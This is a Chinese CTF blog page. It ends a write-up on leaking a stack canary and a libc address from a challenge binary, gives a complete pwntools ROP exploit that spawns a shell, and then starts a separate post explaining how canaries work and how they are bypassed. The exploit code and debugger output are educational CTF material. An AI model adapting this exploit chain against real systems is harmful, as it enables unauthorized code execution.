<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary</span><br><span class="line">AT_RANDOM = <span class="number">0x7fffffffe149</span> <span class="meta"># points to (not masked) global canary value</span></span><br><span class="line">Canary    = <span class="number">0x959c7d572835fc00</span> (may be incorrect on != glibc)</span><br><span class="line">Found valid canaries on the stacks:</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd558</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd5c8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdac8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb28</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb38</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb98</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdc48</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
<p>查找“0x959c7d572835fc00”（canary）的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[anon_7ffff7fb1] <span class="number">0x7ffff7fb6568</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb3e8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb458</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd558</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd5c8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdac8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb28</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb38</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb98</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc48</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdcd8</span> <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
<p>现在我们找到了canary中出现的随机数的地址，还有“buf[0]”中随机数的地址</p>
<p>按道理来说，两者相减就可以得到canary随机数相对于“buf[0]”的偏移了，但是我们却搜索到了多组数据，这是因为这些数据可能在随机数表中多次出现</p>
<p>只有一次一次尝试，把离谱的排除了之后就得到偏移了（相当看脸）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdcd8</span> - <span class="number">0x7fffffffdc76</span> = <span class="number">98</span></span><br><span class="line"><span class="number">98</span> / <span class="number">2</span> = <span class="number">49</span>  <span class="comment">#数组buf的类型为‘int16’</span></span><br></pre></td></tr></table></figure>
<p>第二个问题有一点麻烦：（先看一段代码）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>): <span class="comment">#循环少了匹配的几率小，循环多了匹配的时间长</span></span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
<p>函数<strong>leak</strong>中的offset其实就是canary在随机数表中的偏移，对应偏移中存放的数据就是canary片段的值，这里我们可以用一个很骚的方式获取这个值</p>
<p>我们直接把canary的偏移输入给程序，程序就会读取canary的值，并且用这个值来生成“32位”字符串，我们这里用循环<strong>“从 0 到 0xffff+1”</strong> 依次生成“32位”字符串，然后把“程序生成的”和“我们生成的”进行对比，如果可以匹配就证明canary的值就是对应的下标</p>
<p>​        // 当然也有小概率会重复，多试几次就好了</p>
<p>解决了canary就要考虑怎么获取shell的问题：</p>
<p>首先程序开了PIE的，ROP基本上废了，需要泄露“__libc_start_main”</p>
<p>我们可以用泄露canary的方式来泄露“__libc_start_main”（就是有一点麻烦）</p>
<p>先在pwndbg中看”buf[0]”的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x9bf0</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0x9bf0</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] /* <span class="string">&#x27;create&#x27;</span> */</span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al /* <span class="string">&#x27;&gt; &#x27;</span> */</span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffde00</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd10</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc70</span> ◂— <span class="number">0xd68</span> /* <span class="string">&#x27;h\r&#x27;</span> */</span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
<p>搜索一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0x9bf0</span></span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7fa54e0</span> <span class="number">0xf5fff69bf0</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc86</span> <span class="number">0x9260245d5a0d9bf0</span></span><br></pre></td></tr></table></figure>
<p>然后不知道从哪里掏出来“main”的返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>   <span class="number">0x555555400d80</span></span><br><span class="line">  f <span class="number">1</span>   <span class="number">0x555555400dfe</span></span><br><span class="line">  f <span class="number">2</span>   <span class="number">0x7ffff7dea0b3</span> __libc_start_main+<span class="number">243</span></span><br></pre></td></tr></table></figure>
<p>搜索一下这个地址，就得到了存放“返回地址”的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x7ffff7dea0b3</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdd18</span> <span class="number">0x7ffff7dea0b3</span></span><br></pre></td></tr></table></figure>
<p>两者相减计算偏移：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdd18</span> - <span class="number">0x7fffffffdc86</span> = <span class="number">146</span></span><br><span class="line"><span class="number">146</span> / <span class="number">2</span> = <span class="number">73</span></span><br></pre></td></tr></table></figure>
<p>放入刚刚的模块中“__libc_start_main”的地址就有了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main))</span><br></pre></td></tr></table></figure>
<p>最后可以用“one_gadget”来打</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4f3d5</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f432</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a41c</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line"><span class="keyword">import</span> ctypes </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">stack_libc_start_main_offset = <span class="number">73</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    <span class="comment"># Correct for the 1 and 0 collision.</span></span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    libc = ctypes.cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main-<span class="number">243</span>))</span><br><span class="line"></span><br><span class="line">libc_start_main_offset = libc.libc_start_main_return</span><br><span class="line">libc_base=__libc_start_main-libc_start_main_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">poprdi_ret=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">poprsi_ret=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">poprdx_poprbx_ret=libc_base+<span class="number">0x0000000000162866</span></span><br><span class="line">binsh_libc=libc_base+<span class="number">0x00000000001b75aa</span></span><br><span class="line">execve_libc=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;execve &gt;&gt; &#x27;</span> +<span class="built_in">hex</span>(execve_libc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi_ret)+p64(binsh_libc)</span><br><span class="line">payload+=p64(poprsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprdx_poprbx_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(execve_libc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43921239/article/details/105318835">pwn题查找字符串方法记录</a></p>
<hr>
<p><strong>PS：</strong></p>
<p>我这个libc版本打不了“one_gadget”，只能自己凑了</p>
<p>还有一个问题：用system打不通，但execve一下子就通了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/04/pwn%E7%A9%BFcanary/" class="post-title-link" itemprop="url">pwn穿canary</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-04 22:35:10" itemprop="dateCreated datePublished" datetime="2022-01-04T22:35:10+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-16 18:48:36" itemprop="dateModified" datetime="2022-03-16T18:48:36+08:00">2022-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="canary的各种绕过技巧"><a href="#canary的各种绕过技巧" class="headerlink" title="canary的各种绕过技巧"></a>canary的各种绕过技巧</h2><p>前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了</p>
<p>回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧</p>
<hr>
<h2 id="canary原理"><a href="#canary原理" class="headerlink" title="canary原理"></a>canary原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>
<p>有时候我们会在IDA中看见这两个东西，这就是canary的生成代码</p>
<p>在函数开始，fs:0x28 的值被存储在 ebp - 0xc，在函数返回之前对 ebp - 0xc处的值进行检查，如果和 fs:0x28 不一样，说明发生了溢出，紧接着执行__stack_chk_fail_local 并退出进程 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007F</span>3                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004007F</span>C                 mov     [rsp+<span class="number">128</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">0000000000400804</span>                 <span class="keyword">xor</span>     eax, eax</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400882</span>                 mov     rax, [rsp+<span class="number">128</span>h+var_20]</span><br><span class="line">.text:<span class="number">000000000040088</span>A                 <span class="keyword">xor</span>     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000400893</span>                 jnz     <span class="keyword">short</span> loc_4008A9</span><br><span class="line">    --------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004008</span>A9 loc_4008A9:         </span><br><span class="line">.text:<span class="number">00000000004008</span>A9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png" class width="1641023789366"> 
<p>​        //这个图的上面是高地址，下面是低地址</p>
<p>那么，fs:0x28 中的值是怎么生成的呢？</p>
<p>事实上，TLS 中的值由函数 security_init 进行初始化 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>
<p><strong>在gcc中使用canary：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>这个可以说是经典了，找一找偏移用“%p”一下子就搞出来了</p>
